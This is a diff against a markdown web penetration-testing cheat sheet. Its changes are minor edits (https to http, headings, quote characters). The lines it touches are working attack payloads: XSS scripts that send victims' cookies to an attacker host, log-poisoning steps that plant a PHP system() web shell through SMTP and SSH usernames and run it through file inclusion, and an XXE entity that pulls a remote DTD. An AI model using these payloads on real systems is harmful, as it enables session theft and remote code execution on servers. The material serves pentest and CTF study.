@@ -306,7 +306,7 @@ https://malwaredecoder.com/
 `<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>`  
 `<script>window.location="http://ip/?cookie="+document.cookie;</script>`  
 `<script>document.location="http://ip/?cookie="+document.cookie;</script>`  
-`<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`  
+`<script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>`  
 
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
@@ -318,12 +318,10 @@ https://github.com/JohnHammond/ctf-katana#php
 
 ### PHP Deserialization
 #### PHP - Method Serialization:
-
 -> serialize()  
 -> unserialize()  
 
 #### Magic Methods:
-
 -> __construct()  
 -> __destruct()  
 -> __wakeup()  
@@ -739,16 +737,16 @@ or
   
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
--> mail
+-> SMTP
 
 `telnet ip 23`  
 `MAIL FROM: email@gmail.com`    
 `RCPT TO: <?php system($_GET[‘cmd’]); ?>`  
 `http://ip/index.php?file=/var/mail/mail.log&cmd=id`  
   
--> ssh
+-> SSH
   
-`ssh \‘<?php system($_GET[‘cmd’]);?>’@ip`  
+`ssh \'<?php system($_GET['cmd']);?>'@ip`  
   
 `http://ip/index.php?file=/var/log/auth.log&cmd=id`  
 
@@ -1165,7 +1163,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 -> Part 1 (Request Principal)
 ```
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "https://ip/error.dtd"> 
+<!ENTITY % xxe SYSTEM "http://ip/error.dtd"> 
 %xxe;
 %payload;
 %remote;
